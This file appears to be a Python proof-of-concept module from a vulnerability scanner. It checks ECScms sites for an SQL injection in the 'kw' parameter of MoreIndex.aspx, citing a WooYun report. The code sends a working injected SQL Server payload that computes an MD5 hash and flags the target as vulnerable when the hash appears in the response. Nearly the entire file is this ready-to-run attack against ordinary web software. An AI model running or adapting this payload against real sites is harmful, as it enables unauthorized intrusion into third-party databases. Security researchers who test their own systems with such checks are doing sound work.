#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 易创思ECScms MoreIndex SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-088844
author: Lucifer
description: 文件MoreIndex.aspx中,参数kw存在SQL注入。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class ecscms_MoreIndex_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/MoreIndex.aspx?pkId=0&kw=a%27%20AnD%201=(SeLeCt%20Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27)))--&st=2&t=1"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                printGreen("[+]Success:存在易创思ECScms MoreIndex SQL注入漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在ecscms_MoreIndex_sqli漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = ecscms_MoreIndex_sqli(sys.argv[1])
    testVuln.run()